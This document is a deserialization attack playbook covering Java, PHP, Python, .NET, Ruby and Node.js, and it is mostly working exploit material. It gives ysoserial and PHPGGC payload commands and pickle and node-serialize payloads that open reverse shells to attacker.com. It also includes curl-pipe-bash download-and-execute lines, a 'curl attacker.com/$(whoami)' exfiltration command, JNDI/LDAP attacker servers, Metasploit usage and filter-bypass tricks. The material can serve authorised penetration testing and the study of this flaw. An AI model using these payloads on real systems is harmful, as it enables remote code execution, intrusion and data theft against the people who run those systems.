# Deserialization Playbook

## Indicators

Signs this vulnerability may be present:
- Application accepts serialized data (base64-encoded blobs, binary data in requests)
- Java applications with `.ser` files, `ObjectInputStream`, or `readObject()` patterns
- PHP applications with `serialize()`/`unserialize()` or phar:// handling
- Python applications using pickle, yaml, or marshal
- .NET applications with `BinaryFormatter`, `XmlSerializer`, or ViewState
- Cookies or hidden form fields containing serialized objects
- Content-Type headers indicating serialization (application/x-java-serialized-object)
- Base64-encoded data in parameters starting with characteristic magic bytes

## Magic Bytes Detection

| Format | Magic Bytes | Base64 Prefix | Description |
|--------|-------------|---------------|-------------|
| Java Serialized | `AC ED 00 05` | `rO0AB` | Java ObjectInputStream |
| PHP Serialized | `O:` or `a:` | (plaintext) | PHP serialize() |
| Python Pickle | `80 03` or `80 04` | `gAM` or `gAQ` | Python pickle protocol 3/4 |
| .NET BinaryFormatter | `00 01 00 00 00 FF FF FF FF` | `AAEAAAD/////` | .NET BinaryFormatter |
| .NET ViewState | Starts with `/wE` | `/wE` | ASP.NET ViewState |
| Ruby Marshal | `04 08` | `BAg` | Ruby Marshal.dump |
| JSON | `{` or `[` | `ey` or `W1` | JSON (check for __type) |
| YAML | `---` | (plaintext) | YAML with custom tags |

## Tools

### ysoserial (Java)

```bash
# Generate payload with specific gadget chain
java -jar ysoserial.jar CommonsCollections1 'id' | base64

# Common gadget chains
java -jar ysoserial.jar CommonsCollections1 'curl attacker.com/shell.sh|bash'
java -jar ysoserial.jar CommonsCollections2 'ping -c 1 attacker.com'
java -jar ysoserial.jar CommonsCollections3 'wget http://attacker.com/shell -O /tmp/shell'
java -jar ysoserial.jar CommonsCollections4 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwned'
java -jar ysoserial.jar CommonsCollections6 'whoami > /tmp/output'
java -jar ysoserial.jar CommonsCollections7 'id'

# Other useful gadgets
java -jar ysoserial.jar Jdk7u21 'calc.exe'
java -jar ysoserial.jar Groovy1 'id'
java -jar ysoserial.jar Spring1 'id'
java -jar ysoserial.jar Spring2 'id'
java -jar ysoserial.jar Hibernate1 'id'
java -jar ysoserial.jar Hibernate2 'id'
java -jar ysoserial.jar JBossInterceptors1 'id'
java -jar ysoserial.jar JavassistWeld1 'id'
java -jar ysoserial.jar JSON1 'id'
java -jar ysoserial.jar Myfaces1 'id'
java -jar ysoserial.jar Myfaces2 'id'
java -jar ysoserial.jar ROME 'id'
java -jar ysoserial.jar BeanShell1 'id'
java -jar ysoserial.jar Clojure 'id'

# URLDNS gadget for detection (no code execution, DNS callback only)
java -jar ysoserial.jar URLDNS 'http://uniqueid.burpcollaborator.net'
```

### ysoserial-modified (Extended Gadgets)

```bash
# Extended version with more gadgets
git clone https://github.com/wh1t3p1g/ysoserial
cd ysoserial
mvn clean package -DskipTests

# Additional gadgets
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections8 'id'
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections9 'id'
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections10 'id'
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 'id'
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils2 'id'
```

### JNDI-Injection-Exploit

```bash
# Clone and build
git clone https://github.com/welk1n/JNDI-Injection-Exploit
cd JNDI-Injection-Exploit
mvn clean package -DskipTests

# Start JNDI server
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "id" -A "attacker.com"

# This generates URLs for:
# - RMI: rmi://attacker.com:1099/xxx
# - LDAP: ldap://attacker.com:1389/xxx
```

### marshalsec (JNDI)

```bash
# Clone and build
git clone https://github.com/mbechler/marshalsec
cd marshalsec
mvn clean package -DskipTests

# Start LDAP server with reference to malicious class
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker.com:8080/#Exploit"

# Start RMI server
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://attacker.com:8080/#Exploit"
```

### PHP Deserialization Tools

```bash
# PHPGGC - PHP Generic Gadget Chains
git clone https://github.com/ambionics/phpggc
cd phpggc

# List available gadgets
./phpggc -l

# Generate payloads
./phpggc Laravel/RCE1 system id
./phpggc Laravel/RCE2 system id
./phpggc Symfony/RCE1 system id
./phpggc Guzzle/RCE1 system id
./phpggc Monolog/RCE1 system id
./phpggc Doctrine/RCE1 system id
./phpggc WordPress/RCE1 system id
./phpggc Magento/SQLI1 system id
./phpggc Yii/RCE1 system id
./phpggc ThinkPHP/RCE1 system id

# Generate with phar wrapper
./phpggc -p phar Laravel/RCE1 system id > exploit.phar

# Generate with base64 encoding
./phpggc -b Laravel/RCE1 system id

# Generate with URL encoding
./phpggc -u Laravel/RCE1 system id
```

### Python Deserialization

```python
#!/usr/bin/env python3
# Generate malicious pickle payload
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())

# Using subprocess for more complex commands
import subprocess
class ExploitSubprocess:
    def __reduce__(self):
        return (subprocess.Popen, (('bash', '-c', 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'),))

payload = pickle.dumps(ExploitSubprocess())
print(base64.b64encode(payload).decode())
```

## Techniques

### 1. Java Deserialization

Exploiting Java ObjectInputStream with gadget chains.

```bash
# Step 1: Identify Java serialization
# Look for base64 starting with rO0AB or hex AC ED 00 05
echo "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA..." | base64 -d | xxd | head

# Step 2: Identify libraries via error messages or fingerprinting
# Common vulnerable libraries:
# - Apache Commons Collections 3.x, 4.x
# - Spring Framework
# - Groovy
# - Hibernate
# - JBoss

# Step 3: Generate payload with appropriate gadget
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/?pwned' > payload.ser

# Step 4: Encode and send
base64 payload.ser > payload.b64
curl -X POST "http://target.com/api" \
     -H "Content-Type: application/x-java-serialized-object" \
     --data-binary @payload.ser

# Alternative: Send as base64 in parameter
curl "http://target.com/api?data=$(cat payload.b64 | tr -d '\n' | jq -sRr @uri)"
```

### 2. PHP Deserialization

Exploiting unserialize() with gadget chains.

```php
<?php
// Vulnerable code pattern
$data = unserialize($_GET['data']);

// POP chain exploitation requires finding:
// 1. Sink: __destruct() or __wakeup() with dangerous operations
// 2. Chain: Objects that can be chained to reach the sink
?>
```

```bash
# Generate payload with PHPGGC
./phpggc Laravel/RCE1 system 'id' -b

# Send as GET parameter
curl "http://target.com/page.php?data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bs%3A2%3A%22id%22%3B%7D"

# URL-encoded payload
curl "http://target.com/page.php?data=$(./phpggc Laravel/RCE1 system id -u)"

# Cookie-based injection
curl "http://target.com/" -H "Cookie: session=$(./phpggc Laravel/RCE1 system id -b)"
```

### 3. PHP Phar Deserialization

Exploiting phar:// wrapper to trigger deserialization.

```bash
# Generate phar payload
./phpggc -p phar -o exploit.phar Monolog/RCE1 system id

# Change extension to bypass filters
mv exploit.phar exploit.jpg
mv exploit.phar exploit.gif
mv exploit.phar exploit.pdf

# Trigger via file operation with phar:// wrapper
# Vulnerable functions: file_exists, file_get_contents, include, fopen, etc.
curl "http://target.com/page.php?file=phar:///var/www/uploads/exploit.jpg"
curl "http://target.com/page.php?file=phar:///var/www/uploads/exploit.jpg/test.txt"

# Phar polyglot with valid image header
# Use PHPGGC's polyglot features
./phpggc -p phar -pj exploit.jpg Monolog/RCE1 system id -o exploit_poly.jpg
```

### 4. Python Pickle Deserialization

Exploiting pickle.loads() for RCE.

```python
#!/usr/bin/env python3
import pickle
import base64

# Basic RCE payload
class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(f"Basic RCE: {payload}")

# Reverse shell payload
class ReverseShell:
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen, (
            ['bash', '-c', 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'],
        ))

payload = base64.b64encode(pickle.dumps(ReverseShell())).decode()
print(f"Reverse Shell: {payload}")

# Download and execute
class DownloadExec:
    def __reduce__(self):
        import os
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

payload = base64.b64encode(pickle.dumps(DownloadExec())).decode()
print(f"Download & Exec: {payload}")

# Exfiltrate data
class Exfil:
    def __reduce__(self):
        import os
        return (os.system, ('curl http://attacker.com/$(whoami)',))

payload = base64.b64encode(pickle.dumps(Exfil())).decode()
print(f"Exfiltrate: {payload}")
```

```bash
# Send pickle payload
curl "http://target.com/api" \
     -H "Content-Type: application/octet-stream" \
     --data-binary "$(python3 -c 'import pickle,os,base64;print(base64.b64encode(pickle.dumps(type("X",(),{"__reduce__":lambda s:(os.system,("id",))})())).decode())')"
```

### 5. .NET Deserialization

Exploiting BinaryFormatter and other .NET serializers.

```bash
# Using ysoserial.net
# Download from: https://github.com/pwntester/ysoserial.net

# Generate payloads
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o base64
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "calc" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc" -o base64
ysoserial.exe -g PSObject -f BinaryFormatter -c "calc" -o base64
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "calc" -o base64
ysoserial.exe -g ActivitySurrogateSelector -f BinaryFormatter -c "calc" -o base64

# ViewState exploitation (if MAC validation is disabled or key is known)
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "calc" --validationalg="SHA1" --validationkey="KEY"
```

### 6. Ruby Deserialization

Exploiting Marshal.load().

```ruby
#!/usr/bin/env ruby
# Generate malicious Ruby Marshal payload
require 'base64'

# Universal gadget (works on most Ruby versions)
class Gem::Installer
  def initialize
    @i = 'id'
  end
end

class Gem::SpecFetcher
end

class Gem::Requirement
  def initialize
    @requirements = {
      Gem::Resolver::InstallerSet => :resolve
    }
  end
end

# ERB-based payload
require 'erb'
erb = ERB.allocate
erb.instance_variable_set :@src, '<%= system("id") %>'
erb.instance_variable_set :@filename, "1"
erb.instance_variable_set :@lineno, 1

depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.allocate
depr.instance_variable_set :@instance, erb
depr.instance_variable_set :@method, :result
depr.instance_variable_set :@var, "@result"

payload = Marshal.dump(depr)
puts Base64.strict_encode64(payload)
```

### 7. Node.js Deserialization

Exploiting node-serialize and similar libraries.

```javascript
// Malicious payload for node-serialize
// IIFE (Immediately Invoked Function Expression) payload
const payload = {
    "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });}()"
};

// Serialize and send
const serialize = require('node-serialize');
console.log(serialize.serialize(payload));

// Reverse shell payload
const reverseShell = {
    "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('bash -i >& /dev/tcp/attacker.com/4444 0>&1')}()"
};
```

```bash
# Send payload
curl -X POST "http://target.com/api" \
     -H "Content-Type: application/json" \
     -d '{"data":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\")}()"}'
```

## Gadget Chains by Library

### Apache Commons Collections

| Version | Gadget | Notes |
|---------|--------|-------|
| 3.1-3.2.1 | CommonsCollections1 | InvokerTransformer |
| 3.1-3.2.1 | CommonsCollections3 | ChainedTransformer |
| 3.1-3.2.1 | CommonsCollections5 | BadAttributeValueExpException |
| 3.1-3.2.1 | CommonsCollections6 | HashSet |
| 3.1-3.2.1 | CommonsCollections7 | Hashtable |
| 4.0 | CommonsCollections2 | PriorityQueue |
| 4.0 | CommonsCollections4 | PriorityQueue variant |

### Spring Framework

| Version | Gadget | Notes |
|---------|--------|-------|
| <= 4.1.4 | Spring1 | MethodInvokeTypeProvider |
| <= 4.2.x | Spring2 | Spring AOP |

### Other Libraries

| Library | Gadget | Notes |
|---------|--------|-------|
| Groovy | Groovy1 | ConvertedClosure |
| Hibernate | Hibernate1/2 | HQL injection |
| JBoss | JBossInterceptors1 | InterceptorMethodHandler |
| Javassist + Weld | JavassistWeld1 | ProxyFactory |
| BeanShell | BeanShell1 | Interpreter |
| JSON libraries | JSON1 | PropertyUtils |
| ROME | ROME | ObjectBean |
| Myfaces | Myfaces1/2 | State management |

## Metasploit Modules

```bash
# Java deserialization exploits
use exploit/multi/misc/java_rmi_server
use exploit/multi/http/jenkins_script_console
use exploit/multi/http/jboss_java_deserialize
use exploit/multi/http/weblogic_deserialize
use exploit/multi/http/tomcat_mgr_deploy
use exploit/multi/http/struts2_content_type_ognl
use exploit/multi/http/spring_cloud_function_spel_injection

# Apache Commons Collections
use exploit/multi/misc/java_jmx_server

# JBoss
use exploit/multi/http/jboss_invoke_deploy
use exploit/multi/http/jboss_bshdeployer

# WebLogic
use exploit/multi/http/weblogic_deserialize_rawobject
use exploit/multi/http/weblogic_deserialize_unicastref

# Jenkins
use exploit/multi/http/jenkins_java_deserialize

# Set options
set RHOSTS target.com
set LHOST attacker.com
set LPORT 4444
run
```

## Bypass Techniques

### Java Security Manager Bypass

```java
// Gadgets that work with SecurityManager
// - URLDNS (DNS only, no RCE)
// - JRMP (RMI callback, can chain to RCE)

// Use JRMP gadget to call back to attacker-controlled RMI server
java -jar ysoserial.jar JRMPClient attacker.com:1099
```

### Filter Bypass

```bash
# Blacklist bypass - try different gadget chains
# If CommonsCollections blocked, try:
java -jar ysoserial.jar Groovy1 'id'
java -jar ysoserial.jar Spring1 'id'
java -jar ysoserial.jar Hibernate1 'id'

# Use JDK-only gadgets (no external libraries)
java -jar ysoserial.jar Jdk7u21 'id'

# JNDI injection for newer Java versions
# Use LDAP/RMI references
```

### PHP Magic Methods

```php
<?php
// Target magic methods for gadget chains:
__construct()   // Object creation
__destruct()    // Object destruction
__wakeup()      // Deserialization
__sleep()       // Serialization
__toString()    // String conversion
__call()        // Undefined method call
__get()         // Undefined property read
__set()         // Undefined property write
__invoke()      // Object as function

// Common sinks in gadgets:
file_get_contents()
file_put_contents()
include() / require()
eval()
system() / exec() / passthru()
unlink() / rmdir()
```

### Phar Wrapper Bypass

```bash
# Bypass extension filters
phar://uploads/image.jpg
phar://uploads/image.jpg/test
phar://uploads/image.gif
phar://uploads/document.pdf

# Compressed phar
compress.zlib://phar://uploads/shell.phar
compress.bzip2://phar://uploads/shell.phar

# Double encoding
phar%253A%252F%252Fuploads%252Fshell.phar

# Protocol variation
PHAR://uploads/shell.phar
Phar://uploads/shell.phar
```

### Python Pickle Bypass

```python
#!/usr/bin/env python3
import pickle
import base64

# If os.system blocked, try subprocess
class Bypass1:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['id'],))

# Use eval for more flexibility
class Bypass2:
    def __reduce__(self):
        return (eval, ("__import__('os').system('id')",))

# Use exec for multi-line code
class Bypass3:
    def __reduce__(self):
        code = """
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker.com",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""
        return (exec, (code,))

# Payload for restricted environments
class Bypass4:
    def __reduce__(self):
        return (
            getattr,
            (
                __import__('os'),
                'system'
            )
        )
```

## Success Indicators

- DNS callback received when using URLDNS gadget
- HTTP callback received from payload execution
- Reverse shell connection established
- Time delay observed (for time-based confirmation)
- Error messages revealing deserialization stack traces
- File created on target system (touch /tmp/pwned)
- Command output reflected in response
- Out-of-band data exfiltration received
- Server-side behavior change indicating code execution
- Log entries showing executed commands
